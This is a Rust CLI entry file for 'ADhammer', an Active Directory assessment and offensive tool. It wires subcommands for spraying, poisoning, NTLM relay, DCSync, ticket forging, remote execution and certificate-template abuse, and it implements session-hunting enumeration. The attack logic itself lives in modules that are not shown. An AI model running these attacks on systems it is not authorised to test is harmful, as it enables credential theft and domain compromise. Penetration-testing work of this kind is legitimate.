//! ADhammer — Active Directory security assessment and offensive tradecraft in Rust.
//! Pipeline: LDAP collect → build control-path graph → run checks → score → report.

// clippy 1.98 wants `as_chunks::<N>()` — Rust 1.98+; we hold MSRV 1.80. See rationale in
// [`adhammer_secrets`]'s crate doc.
#![allow(unknown_lints, clippy::chunks_exact_to_as_chunks)]

use adhammer_collector::{Collector, LdapConfig};
use adhammer_graph::ControlGraph;
use adhammer_report::{Report, RiskConfig};
use anyhow::{Context, Result};
use clap::{Parser, Subcommand};

mod adcs_relay;
mod attacks;
mod dcshadow;
mod esc_registry;
mod guided;
mod host_posture;
mod interactive;
mod poison;
mod session;
mod ui;
mod winrm;

#[derive(Parser)]
#[command(
    name = "adhammer",
    version,
    about = "Passive AD security assessment in Rust"
)]
struct Cli {
    /// Reuse the last saved session (skip setup prompts, go straight to the menu).
    #[arg(long)]
    old: bool,

    /// Don't persist the session (creds) to disk — for use on a client/engagement box.
    #[arg(long)]
    no_save: bool,

    /// Route ALL outbound TCP through a SOCKS5 pivot: `[user:pass@]host:port` (proxy-side DNS).
    /// Covers SMB, RPC/DCSync/Zerologon, LDAP, KDC, WinRM and the network sweep.
    #[arg(long, global = true, value_name = "[user:pass@]host:port")]
    socks: Option<String>,

    /// Emit structured JSON output (AttackResult envelope) instead of human-readable text.
    /// Applies to attack/enum/dump subcommands. Scan already emits JSON by default.
    #[arg(long, global = true)]
    json: bool,

    #[command(subcommand)]
    cmd: Option<Command>,
}

#[derive(Subcommand)]
enum Command {
    /// Passive audit: LDAP collection → control-path graph → 41 checks → scored report.
    Scan(ScanArgs),
    /// Read-only enumeration: SAMR/LSAT/network sweep/DNS zones/AD CS/DC posture/logon sessions.
    #[command(subcommand)]
    Enum(EnumCmd),
    /// Active attacks: roast/spray/abuse/coerce/relay/RBCD/DCSync/exec/WMI/LAPS/ESC1-4/golden/silver/PtT/BadSuccessor/DCShadow.
    #[command(subcommand)]
    Attack(AttackCmd),
    /// Offline / single-purpose check runners — subset of `scan` for one taxonomy at a time.
    #[command(subcommand)]
    Check(CheckCmd),
    /// Dump credentials / secrets from AD (LAPS, gMSA).
    #[command(subcommand)]
    Dump(DumpCmd),
    /// Guided: scan → correlate → confirm each weakness → validate + PoC → report.
    Auto(AutoArgs),
}

#[derive(Subcommand)]
enum CheckCmd {
    /// Run the ms-crtd ESC1-15 rule pack over pKICertificateTemplate objects
    /// collected from LDAP. Complements `scan` — no ACL walk, just the
    /// template-shape checks straight out of `ms-crtd::detect_esc`.
    Adcs(CheckAdcsArgs),
}

#[derive(Parser)]
struct CheckAdcsArgs {
    /// LDAP URL, e.g. ldaps://dc.corp.local:636
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// Emit findings as JSON (default: human-readable).
    #[arg(long)]
    json: bool,
}

#[derive(Subcommand)]
enum DumpCmd {
    /// Dump LAPS local-admin passwords. Wire path over the `ms-gkdi` seed-key
    /// derivation is TODO — this subcommand today reuses the existing
    /// `attack laps` code path over dpapi-ng and prints a hint for the
    /// ms-gkdi-only route.
    Laps(DumpLapsArgs),
    /// Dump gMSA `msDS-ManagedPassword` blobs. TODO wire onto ms-gkdi for the
    /// LAPS-v2 style seed-key derivation; for now falls back to `attack gmsa`
    /// (which speaks the SEALED LDAP path directly).
    Gmsa(DumpGmsaArgs),
}

#[derive(Parser)]
struct DumpLapsArgs {
    /// Target sAMAccountName, e.g. `WIN11$`. Omit to dump every readable entry.
    #[arg(long)]
    target: Option<String>,
    /// LDAP URL (LDAPS required for the sealed channel that returns the blob).
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// DC host / KDC for the GKDI GetKey call (defaults to the URL host).
    #[arg(long)]
    dc: Option<String>,
}

#[derive(Parser)]
struct DumpGmsaArgs {
    /// gMSA sAMAccountName (e.g. `gmsa_web$`).
    #[arg(long)]
    target: String,
    /// LDAP URL (LDAPS required).
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
}

#[derive(Parser)]
struct AutoArgs {
    /// LDAP URL, e.g. ldaps://dc:636
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
    /// DC host/IP for SMB/Kerberos validators (defaults to the URL host).
    #[arg(long)]
    host: Option<String>,
    /// NetBIOS domain (defaults to the collected domain).
    #[arg(long)]
    domain: Option<String>,
    /// Kerberos realm (defaults to the DNS domain, upper-cased).
    #[arg(long)]
    realm: Option<String>,
    /// KDC host (defaults to --host).
    #[arg(long)]
    kdc: Option<String>,
    /// Report output path (Markdown).
    #[arg(long, default_value = "adhammer-report.md")]
    out: String,
    /// Validate every finding without prompting (unattended).
    #[arg(long)]
    yes: bool,
    /// Skip the per-finding "Impact" attack-chain narrative in the Markdown report.
    /// The interactive card still shows it either way.
    #[arg(long)]
    no_impact: bool,
}

#[derive(Subcommand)]
enum EnumCmd {
    /// Enumerate domain users over SAMR (SMB named pipe).
    Samr(attacks::samr::SamrArgs),
    /// Resolve a name to its SID over LSAT (\lsarpc).
    Lsa(attacks::lsa::LsaArgs),
    /// Sweep a network: live hosts, AD ports, and SMB signing (NTLM-relay targets).
    Net(NetArgs),
    /// Enumerate AD-integrated DNS zones + records over LDAP (adidnsdump-style).
    Dns(DnsArgs),
    /// Enumerate enterprise CAs and probe each for ESC8 web-enrollment exposure.
    Adcs(DnsArgs),
    /// Registry-only AD CS ESC checks (ESC6/10/11/16) over MS-RRP — needs Remote Registry.
    Esc(EscArgs),
    /// DC posture over MS-RRP + pipes: LDAP signing / channel binding + Spooler (relay/coercion enablers).
    Posture(PostureArgs),
    /// Enumerate a host's logon sessions over SRVSVC (\srvsvc) — session hunting (HasSession).
    Sessions(SessionsArgs),
    /// Enumerate logged-on users via WKSSVC (\wkssvc) — NetrWkstaUserEnum level 1 (needs local admin).
    Wkssvc(SessionsArgs),
    /// Enumerate logged-on SIDs via HKU registry enumeration over MS-RRP (often works without local admin).
    Hku(SessionsArgs),
}

#[derive(Parser)]
struct SessionsArgs {
    /// Target host or IP whose logon sessions to enumerate.
    #[arg(long)]
    host: String,
    /// Domain the bind identity belongs to (NetBIOS or DNS form, e.g. `CORP` or `corp.local`).
    #[arg(long)]
    domain: String,
    /// Bind username — sAMAccountName, `DOMAIN\user`, or `user@realm`.
    #[arg(long)]
    user: String,
    #[arg(long, default_value = "")]
    password: String,
    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
    #[arg(long)]
    nt_hash: Option<String>,
    /// Include machine-account (`$`-suffixed) principals in the output. Default is off —
    /// on a DC these flood the list with the DC's own machine-account service sessions.
    #[arg(long)]
    include_machine: bool,
}

#[derive(Parser)]
struct PostureArgs {
    /// DC host or IP.
    #[arg(long)]
    host: String,
    /// NetBIOS domain, e.g. CORP.
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
}

// ZerologonArgs moved to `attacks::zerologon` in arch-0.

#[derive(Parser)]
struct EscArgs {
    /// CA host. ESC10 is read from this host's Kdc key too, so point it at a DC-hosted CA.
    #[arg(long)]
    host: String,
    /// NetBIOS domain, e.g. CORP.
    #[arg(long)]
    domain: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    /// CA name (the `Configuration\<CA>` registry key), e.g. corp-CA.
    #[arg(long)]
    ca: String,
}

#[derive(Parser)]
struct NetArgs {
    /// Targets: CIDR (10.0.0.0/24), comma-list (a,b,c), or @file (one host per line)
    #[arg(long)]
    targets: String,
    /// Max concurrent host probes
    #[arg(long, default_value = "256")]
    concurrency: usize,
    /// Per-service checks: FTP anon, SMTP VRFY, DNS version/AXFR, NFS showmount, rsync modules,
    /// SNMP community, MSSQL/MySQL version+login, RPC/EPM surface, WinRM auth, VNC no-auth, Redis
    #[arg(long)]
    deep: bool,
    /// DNS zone to attempt AXFR against (deep DNS check); e.g. corp.local
    #[arg(long)]
    zone: Option<String>,
    /// SNMP community strings to try (deep, UDP/161); comma-separated
    #[arg(long, default_value = "public,private")]
    community: String,
}

#[derive(Subcommand)]
enum AttackCmd {
    /// Kerberos AS-REP roast + Kerberoast (RC4/AES hashcat output).
    Roast(ScanArgs),
    /// Kerberos password spray / user enumeration.
    Spray(attacks::spray::SprayArgs),
    /// LDAP abuse: add-spn / add-member / set-password / write-rbcd.
    Abuse(attacks::abuse::AbuseArgs),
    /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
    Coerce(attacks::coerce::CoerceArgs),
    /// Zerologon (CVE-2020-1472) SAFE detection over MS-NRPC — never resets the machine password.
    Zerologon(attacks::zerologon::ZerologonArgs),
    /// RBCD: S4U2Self + S4U2Proxy to impersonate a user to a target service.
    Rbcd(attacks::rbcd::RbcdArgs),
    /// Constrained delegation abuse: same S4U2Self+S4U2Proxy chain via a `msDS-AllowedToDelegateTo`
    /// account with protocol transition (impersonate any user to the allowed service).
    Constrained(attacks::rbcd::RbcdArgs),
    /// Ask-TGT: get a TGT with a password and write a reusable ccache (Kerberos `-k` workflows).
    Asktgt(attacks::asktgt::AsktgtArgs),
    /// DCSync: replicate a target's secrets via DRSUAPI over a sealed RPC channel.
    Dcsync(attacks::dcsync::DcsyncArgs),
    /// Capture NetNTLMv2 from coerced/poisoned victims (SMB listener → hashcat -m 5600).
    Capture(CaptureArgs),
    /// Poison LLMNR + NBT-NS name resolution to lure victims to us (pair with `capture`).
    Poison(PoisonArgs),
    /// NTLM relay: SMB victim → LDAP/RBCD/AD CS Web (ESC8)/ICPR (ESC11). Pick with --target.
    Relay(attacks::relay::RelayArgs),
    /// Remote command execution as LocalSystem over SVCCTL (psexec-style service create/run/delete).
    Exec(attacks::exec_pack::ExecArgs),
    /// Remote command execution as LocalSystem over TSCH (atexec-style scheduled task).
    Atexec(attacks::exec_pack::ExecArgs),
    /// Remote command execution over WMI (DCOM → Win32_Process.Create), output captured over C$.
    Wmiexec(attacks::exec_pack::ExecArgs),
    /// Local secretsdump: reg-save SYSTEM+SAM, pull over C$, decrypt local NT hashes offline.
    Secretsdump(attacks::secretsdump::SecretsdumpArgs),
    /// Read a gMSA managed password over LDAP → NT hash (for accounts you may retrieve).
    Gmsa(attacks::gmsa::GmsaArgs),
    /// Read LAPS local-admin passwords (ms-Mcs-AdmPwd / msLAPS-Password) over LDAPS.
    Laps(attacks::laps::LapsArgs),
    /// Execute a command over WinRM (WS-Man, 5985/HTTP, NTLM + message encryption).
    Winrm(attacks::winrm_exec::WinrmArgs),
    /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
    Esc1(attacks::esc1::Esc1Args),
    /// ESC1 request marshaled via `ms-icpr`: build a CSR with an
    /// attacker-supplied UPN SAN and marshal the `CertServerRequest` opnum.
    /// Sealed `\PIPE\cert` transport is not wired in this build — the command
    /// runs offline preflight + emits the marshaled bytes so the wire can be
    /// verified before a live submission.
    #[command(name = "icpr-esc1")]
    IcprEsc1(attacks::icpr_esc1::IcprEsc1Args),
    /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
    Golden(attacks::golden::GoldenArgs),
    /// Silver ticket: forge a service ticket (TGS) for an SPN with the service account's AES256 key.
    Silver(attacks::silver::SilverArgs),
    /// Pass-the-ticket (PtT): forge golden/silver → get a service ticket → Kerberos AP-REQ over
    /// SMB → authenticate (and optionally run a command as the impersonated identity).
    ///
    /// **Rename from `pth`.** The `pth` subcommand still resolves as an alias for one release
    /// but emits a deprecation warning at runtime. The industry PTH acronym means
    /// *pass-the-hash*; `attack ptt` describes what this actually is.
    #[command(name = "ptt", visible_alias = "pth")]
    Ptt(attacks::ptt::PthArgs),
    /// Find `TRUSTED_FOR_DELEGATION` hosts (non-DC) — unconstrained-delegation abuse targets.
    Unconstrained(ScanArgs),
    /// BadSuccessor (Server 2025 dMSA) — create a delegated MSA that succeeds a chosen victim.
    Badsuccessor(attacks::badsuccessor::BadsuccessorArgs),
    /// ESC4 — write a certificate template's attributes to make it ESC1-vulnerable.
    Esc4(attacks::esc4::Esc4Args),
    /// Shadow Credentials — thin alias over `attack abuse --action add-keycred` / `pkinit`.
    Shadowcred(attacks::shadowcred::ShadowcredArgs),
    /// DCShadow — default: enumerate DCSync-capable principals. `--prep <name>` registers a rogue
    /// nTDSDSA under Configuration NC (phase 1 of the Le Toux DCShadow chain); `--cleanup <name>`
    /// removes it. Full push (phase 2) is not yet implemented.
    Dcshadow(DcshadowArgs),
}

#[derive(Parser)]
struct DcshadowArgs {
    #[command(flatten)]
    scan: ScanArgs,
    /// Register a rogue nTDSDSA with this CN (phase 1). Idempotent: rerunning with the same
    /// name after a partial failure is safe. Requires Domain Admin or Configuration NC write.
    #[arg(long)]
    prep: Option<String>,
    /// Remove a rogue nTDSDSA previously created with --prep. NoSuchObject is swallowed.
    #[arg(long)]
    cleanup: Option<String>,
    /// AD site name for --prep / --cleanup [default: Default-First-Site-Name].
    #[arg(long, default_value = "Default-First-Site-Name")]
    site: String,
}

// PthArgs moved to attacks::ptt in arch-0.

// SilverArgs moved to attacks::silver in arch-0.

// GoldenArgs moved to attacks::golden in arch-0.

// EscVariant + IcprEsc1Args moved to attacks::icpr_esc1 in arch-0.

// Esc1Args moved to attacks::esc1 in arch-0.

// GmsaArgs moved to attacks::gmsa in arch-0.

// LapsArgs moved to attacks::laps in arch-0.

#[derive(Parser)]
struct DnsArgs {
    /// LDAP URL, e.g. ldap://dc:389 or ldaps://dc:636
    #[arg(long)]
    url: String,
    #[arg(long)]
    user: String,
    #[arg(long)]
    password: String,
    #[arg(long)]
    insecure: bool,
}

// WinrmArgs moved to attacks::winrm_exec in arch-0.

// SecretsdumpArgs moved to attacks::secretsdump in arch-0.

// ExecArgs moved to attacks::exec_pack in arch-0.

// RelayTarget + RelayArgs moved to attacks::relay in arch-0.

#[derive(Parser)]
struct PoisonArgs {
    /// Our IP to hand out for every poisoned name (where `attack capture` listens)
    #[arg(long)]
    spoof_ip: std::net::Ipv4Addr,
}

#[derive(Parser)]
struct CaptureArgs {
    /// Address to listen on, e.g. 0.0.0.0:445 (needs privilege for 445)
    #[arg(long, default_value = "0.0.0.0:445")]
    listen: String,
}

// DcsyncArgs moved to attacks::dcsync in arch-0.

// AsktgtArgs moved to `attacks::asktgt` in arch-0.

// BadsuccessorArgs moved to `attacks::badsuccessor` in arch-0.

// Esc4Args moved to `attacks::esc4` in arch-0.

// ShadowcredArgs moved to attacks::shadowcred in arch-0.

// RbcdArgs moved to attacks::rbcd in arch-0.

// CoercePipe moved to attacks::coerce in arch-0.

// CoerceArgs moved to attacks::coerce in arch-0.

// AbuseAction moved to attacks::abuse in arch-0.

// AbuseArgs moved to attacks::abuse in arch-0.

// SprayArgs moved to `attacks::spray` in arch-0.

// LsaArgs moved to attacks::lsa in arch-0.

// SamrArgs moved to attacks::samr in arch-0.

#[derive(Parser)]
struct ScanArgs {
    /// LDAP URL, e.g. ldap://dc.corp.local:389 or ldaps://dc.corp.local:636
    #[arg(long)]
    url: String,
    /// Bind identity: user@realm, DOMAIN\\user, or full DN
    #[arg(long)]
    user: String,
    /// Bind password
    #[arg(long)]
    password: String,
    /// Base DN (defaults to RootDSE defaultNamingContext)
    #[arg(long)]
    base_dn: Option<String>,
    /// Output format for `scan`: `json` (default) or `html`. When `--out <path>` is
    /// set the format is auto-inferred from the file extension (`.json` / `.html` /
    /// `.zip` → BloodHound-CE bundle); this flag overrides that inference.
    #[arg(long, default_value = "json", value_parser = ["json", "html"])]
    format: String,
    /// Write the report to `<path>` instead of stdout. Format is inferred from the
    /// extension: `.json` → JSON, `.html` → HTML, `.zip` → BloodHound-CE ingest
    /// bundle. Pass `--format` to override the inference. Tracing / diagnostics
    /// still go to stderr, so stdout stays capture-clean for scripting.
    #[arg(long)]
    out: Option<String>,
    /// KDC `host[:port]` for `roast` to actually AS-REP roast (omit = list candidates only)
    #[arg(long)]
    kdc: Option<String>,
    /// SYSVOL path for `scan` to hunt GPP cpasswords, e.g. \\corp.local\SYSVOL
    #[arg(long)]
    sysvol: Option<String>,
    /// Skip TLS certificate verification (LDAPS against a self-signed / lab DC)
    #[arg(long)]
    insecure: bool,
    /// SASL GSSAPI bind (signed LDAP over 389 via ambient Kerberos; needs `--features gssapi`)
    #[arg(long)]
    gssapi: bool,
    /// **Deprecated in favour of `--out <path.zip>`.** Also export the collected
    /// domain as a BloodHound .zip at this path (BloodHound CE v5 ingest JSON).
    /// Will be removed in 1.5.0.
    #[arg(long)]
    bloodhound: Option<String>,
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt().with_target(false).init();
    let cli = Cli::parse();

    // Register the SOCKS5 pivot (if any) before any connection is made. Every owned transport
    // (smb2-client, dcerpc) and the in-tree TCP dials consult this global.
    if let Some(spec) = &cli.socks {
        match smb2_client::socks::Socks5::parse(spec) {
            Some(cfg) => {
                ui::info(&format!("routing all TCP through SOCKS5 {}", cfg.proxy));
                smb2_client::socks::set_proxy(Some(cfg));
            }
            None => {
                anyhow::bail!("invalid --socks value '{spec}' (expected [user:pass@]host:port)");
            }
        }
    }

    match cli.cmd {
        None => interactive::run(cli.old, cli.no_save).await,
        Some(cmd) => {
            if cli.json {
                dispatch_json(cmd).await
            } else {
                dispatch(cmd).await
            }
        }
    }
}

async fn dispatch_json(cmd: Command) -> Result<()> {
    let cmd_str = format!("adhammer {}", cmd_label(&cmd));
    let result = dispatch(cmd).await;
    let ar = adhammer_core::AttackResult {
        command: cmd_str,
        success: result.is_ok(),
        evidence: match &result {
            Ok(()) => String::new(),
            Err(e) => format!("{e:#}"),
        },
        finding_id: None,
    };
    println!("{}", serde_json::to_string_pretty(&ar).unwrap_or_default());
    result
}

fn cmd_label(cmd: &Command) -> &'static str {
    match cmd {
        Command::Scan(_) => "scan",
        Command::Enum(e) => match e {
            EnumCmd::Samr(_) => "enum samr",
            EnumCmd::Lsa(_) => "enum lsa",
            EnumCmd::Net(_) => "enum net",
            EnumCmd::Dns(_) => "enum dns",
            EnumCmd::Adcs(_) => "enum adcs",
            EnumCmd::Esc(_) => "enum esc",
            EnumCmd::Posture(_) => "enum posture",
            EnumCmd::Sessions(_) => "enum sessions",
            EnumCmd::Wkssvc(_) => "enum wkssvc",
            EnumCmd::Hku(_) => "enum hku",
        },
        Command::Attack(a) => match a {
            AttackCmd::Roast(_) => "attack roast",
            AttackCmd::Spray(_) => "attack spray",
            AttackCmd::Abuse(_) => "attack abuse",
            AttackCmd::Coerce(_) => "attack coerce",
            AttackCmd::Zerologon(_) => "attack zerologon",
            AttackCmd::Rbcd(_) => "attack rbcd",
            AttackCmd::Constrained(_) => "attack constrained",
            AttackCmd::Asktgt(_) => "attack asktgt",
            AttackCmd::Dcsync(_) => "attack dcsync",
            AttackCmd::Capture(_) => "attack capture",
            AttackCmd::Poison(_) => "attack poison",
            AttackCmd::Relay(_) => "attack relay",
            AttackCmd::Exec(_) => "attack exec",
            AttackCmd::Atexec(_) => "attack atexec",
            AttackCmd::Wmiexec(_) => "attack wmiexec",
            AttackCmd::Secretsdump(_) => "attack secretsdump",
            AttackCmd::Gmsa(_) => "attack gmsa",
            AttackCmd::Laps(_) => "attack laps",
            AttackCmd::Winrm(_) => "attack winrm",
            AttackCmd::Esc1(_) => "attack esc1",
            AttackCmd::IcprEsc1(_) => "attack icpr-esc1",
            AttackCmd::Golden(_) => "attack golden",
            AttackCmd::Silver(_) => "attack silver",
            AttackCmd::Ptt(_) => "attack ptt",
            AttackCmd::Unconstrained(_) => "attack unconstrained",
            AttackCmd::Badsuccessor(_) => "attack badsuccessor",
            AttackCmd::Esc4(_) => "attack esc4",
            AttackCmd::Shadowcred(_) => "attack shadowcred",
            AttackCmd::Dcshadow(_) => "attack dcshadow",
        },
        Command::Check(_) => "check adcs",
        Command::Dump(d) => match d {
            DumpCmd::Laps(_) => "dump laps",
            DumpCmd::Gmsa(_) => "dump gmsa",
        },
        Command::Auto(_) => "auto",
    }
}

async fn dispatch(cmd: Command) -> Result<()> {
    match cmd {
        Command::Scan(a) => scan(a).await,
        Command::Enum(EnumCmd::Samr(a)) => attacks::samr::samr(a).await,
        Command::Enum(EnumCmd::Lsa(a)) => attacks::lsa::lsa(a).await,
        Command::Enum(EnumCmd::Net(a)) => netenum(a).await,
        Command::Enum(EnumCmd::Dns(a)) => dnsenum(a).await,
        Command::Enum(EnumCmd::Adcs(a)) => adcsenum(a).await,
        Command::Enum(EnumCmd::Esc(a)) => esc_registry_scan(a).await,
        Command::Enum(EnumCmd::Posture(a)) => posture_scan(a).await,
        Command::Enum(EnumCmd::Sessions(a)) => sessions(a).await,
        Command::Enum(EnumCmd::Wkssvc(a)) => wkssvc_enum(a).await,
        Command::Enum(EnumCmd::Hku(a)) => hku_enum(a).await,
        Command::Attack(AttackCmd::Roast(a)) => roast(a).await,
        Command::Attack(AttackCmd::Spray(a)) => attacks::spray::spray(a).await,
        Command::Attack(AttackCmd::Abuse(a)) => attacks::abuse::abuse(a).await,
        Command::Attack(AttackCmd::Coerce(a)) => attacks::coerce::coerce(a).await,
        Command::Attack(AttackCmd::Zerologon(a)) => attacks::zerologon::zerologon(a).await,
        Command::Attack(AttackCmd::Rbcd(a)) => attacks::rbcd::rbcd(a).await,
        Command::Attack(AttackCmd::Constrained(a)) => attacks::rbcd::rbcd(a).await,
        Command::Attack(AttackCmd::Asktgt(a)) => attacks::asktgt::asktgt(a).await,
        Command::Attack(AttackCmd::Dcsync(a)) => attacks::dcsync::dcsync(a).await,
        Command::Attack(AttackCmd::Capture(a)) => smb2_client::server::capture(&a.listen)
            .await
            .map_err(Into::into),
        Command::Attack(AttackCmd::Poison(a)) => poison::poison(a.spoof_ip).await,
        Command::Attack(AttackCmd::Relay(a)) => attacks::relay::relay(a).await,
        Command::Attack(AttackCmd::Exec(a)) => attacks::exec_pack::exec_cmd(a).await,
        Command::Attack(AttackCmd::Atexec(a)) => attacks::exec_pack::atexec_cmd(a).await,
        Command::Attack(AttackCmd::Wmiexec(a)) => attacks::exec_pack::wmiexec_cmd(a).await,
        Command::Attack(AttackCmd::Secretsdump(a)) => attacks::secretsdump::secretsdump(a).await,
        Command::Attack(AttackCmd::Gmsa(a)) => attacks::gmsa::gmsa(a).await,
        Command::Attack(AttackCmd::Laps(a)) => attacks::laps::laps(a).await,
        Command::Attack(AttackCmd::Winrm(a)) => attacks::winrm_exec::winrm_exec(a).await,
        Command::Attack(AttackCmd::Esc1(a)) => attacks::esc1::esc1(a).await,
        Command::Attack(AttackCmd::IcprEsc1(a)) => attacks::icpr_esc1::icpr_esc1(a).await,
        Command::Attack(AttackCmd::Golden(a)) => attacks::golden::golden(a).await,
        Command::Attack(AttackCmd::Silver(a)) => attacks::silver::silver(a).await,
        Command::Attack(AttackCmd::Ptt(a)) => {
            // Emit the deprecation notice when the operator reached us through the `pth` alias.
            if std::env::args().any(|a| a == "pth") {
                eprintln!(
                    "[!] `attack pth` is deprecated (industry PTH = pass-the-hash); \
                     use `attack ptt` (pass-the-ticket). Alias will be removed in 1.5.0."
                );
            }
            attacks::ptt::pth(a).await
        }
        Command::Attack(AttackCmd::Unconstrained(a)) => {
            attacks::unconstrained::unconstrained(a).await
        }
        Command::Attack(AttackCmd::Badsuccessor(a)) => attacks::badsuccessor::badsuccessor(a).await,
        Command::Attack(AttackCmd::Esc4(a)) => attacks::esc4::esc4(a).await,
        Command::Attack(AttackCmd::Shadowcred(a)) => attacks::shadowcred::shadowcred(a).await,
        Command::Attack(AttackCmd::Dcshadow(a)) => dcshadow(a).await,
        Command::Check(CheckCmd::Adcs(a)) => check_adcs(a).await,
        Command::Dump(DumpCmd::Laps(a)) => dump_laps(a).await,
        Command::Dump(DumpCmd::Gmsa(a)) => dump_gmsa(a).await,
        Command::Auto(a) => {
            guided::guided(guided::GuidedArgs {
                url: a.url,
                user: a.user,
                password: a.password,
                insecure: a.insecure,
                host: a.host,
                domain: a.domain,
                realm: a.realm,
                kdc: a.kdc,
                out: a.out,
                yes: a.yes,
                no_impact: a.no_impact,
            })
            .await
        }
    }
}

// fn rbcd moved to attacks::rbcd in arch-0.

// fn asktgt moved to `attacks::asktgt` in arch-0.
// fn dcsync moved to attacks::dcsync in arch-0.

/// `enum sessions` — enumerate a host's logon sessions over SRVSVC (session hunting). Each row is
/// a (user, client computer) pair; a privileged user here marks the host as a credential-theft
/// target, i.e. a `HasSession` edge into that user.
async fn sessions(mut a: SessionsArgs) -> Result<()> {
    use dcerpc::srvsvc::SrvsvcClient;
    use smb2_client::SmbClient;

    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("srvsvc").await?;
    let mut srv = SrvsvcClient::bind(&mut smb, pipe).await?;
    let (list, ret) = srv.enum_sessions().await?;
    if ret != 0 {
        eprintln!("[!] NetrSessionEnum returned 0x{ret:08x} (access denied? need local admin on many hosts)");
    }
    if list.is_empty() {
        eprintln!("[-] no sessions returned on {}", a.host);
    } else {
        eprintln!("[+] {} session(s) on {}:", list.len(), a.host);
        for s in &list {
            let from = if s.client.is_empty() { "?" } else { &s.client };
            println!("    {:<24} from {from}", s.user);
        }
    }
    Ok(())
}

async fn wkssvc_enum(mut a: SessionsArgs) -> Result<()> {
    use dcerpc::wkssvc::WkstaUserClient;
    use smb2_client::SmbClient;
    use std::collections::BTreeMap;

    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("wkssvc").await?;
    let mut wks = WkstaUserClient::bind(&mut smb, pipe).await?;
    let (list, ret) = wks.enum_users().await?;
    if ret != 0 {
        eprintln!("[!] NetrWkstaUserEnum returned {ret} (need local admin)");
    }
    let raw = list.len();
    // Dedup on (user, domain, logon_server) — one Windows box typically emits many LSA
    // sessions per principal (one per service / logon type), which for HasSession-style
    // graph building is noise. Machine accounts (`$`-suffixed) are filtered unless
    // --include-machine, since on a DC they're the flood.
    let mut grouped: BTreeMap<(String, String, String), usize> = BTreeMap::new();
    let mut machine_hidden = 0usize;
    for u in &list {
        if !a.include_machine && u.username.ends_with('$') {
            machine_hidden += 1;
            continue;
        }
        *grouped
            .entry((
                u.username.clone(),
                u.logon_domain.clone(),
                u.logon_server.clone(),
            ))
            .or_default() += 1;
    }
    if grouped.is_empty() {
        eprintln!(
            "[-] no logged-on users on {} (raw={raw}, machine-hidden={machine_hidden})",
            a.host
        );
        if machine_hidden > 0 && !a.include_machine {
            eprintln!("    pass --include-machine to show machine-account sessions");
        }
    } else {
        eprintln!(
            "[+] {} unique principal(s) on {} (raw={raw}, machine-hidden={machine_hidden}):",
            grouped.len(),
            a.host
        );
        for ((user, domain, server), count) in &grouped {
            let mark = if *count > 1 {
                format!(" ×{count}")
            } else {
                String::new()
            };
            let srv = if server.is_empty() { "(none)" } else { server };
            println!("    {domain}\\{user:<24} server={srv}{mark}");
        }
    }
    Ok(())
}

async fn hku_enum(mut a: SessionsArgs) -> Result<()> {
    use dcerpc::rrp::RegistryClient;
    use smb2_client::SmbClient;

    a.password = resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let mut reg = match RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host)
        .await
    {
        Ok(r) => r,
        Err(e) => {
            let msg = e.to_string();
            if msg.contains("0xc00000ac") || msg.contains("open \\winreg") {
                anyhow::bail!(
                    "Remote Registry service is stopped on {} — start it or use `enum wkssvc` / `enum sessions` instead",
                    a.host
                );
            }
            return Err(e.into());
        }
    };
    let sids = reg.logged_on_sids().await?;
    if sids.is_empty() {
        eprintln!("[-] no logged-on SIDs via HKU on {}", a.host);
    } else {
        eprintln!("[+] {} logged-on SID(s) via HKU on {}:", sids.len(), a.host);
        for s in &sids {
            println!("    {}", s.sid);
        }
    }
    Ok(())
}

// fn dcsync_all moved to attacks::dcsync in arch-0.

/// Resolve a credential-flag value that came in through argv. If the operator
/// passed an empty `--password` / `--nt-hash` (the recommended way to avoid the
/// `ps` / shell-history leak), we fall back to the matching env var — currently
/// `ADHAMMER_PASSWORD` and `ADHAMMER_NT_HASH`. Non-empty argv values pass
/// through unchanged (backwards-compatible; scripts that already inline
/// creds keep working). When the flag was not set AND the env var is empty,
/// we return the empty string and let the downstream call fail with its own
/// domain-specific error, so we don't confuse "meant to set it, forgot" with
/// "this attack doesn't actually need auth".
///
/// Rationale: the boss review flagged that every subcommand takes secrets
/// straight on argv (`sec-2`), leaking to `ps`, `~/.bash_history`, sudo logs.
///
/// Resolution order (first non-empty wins):
///
/// 1. `--password @file:/path/to/pw` — read from file (trailing \r\n trimmed).
/// 2. `--password foo` — literal value; the leaky path, CI should prefer 1 or 3.
/// 3. `$ADHAMMER_PASSWORD` env var.
/// 4. Interactive prompt (only when stdin is a TTY) via `dialoguer::Password`.
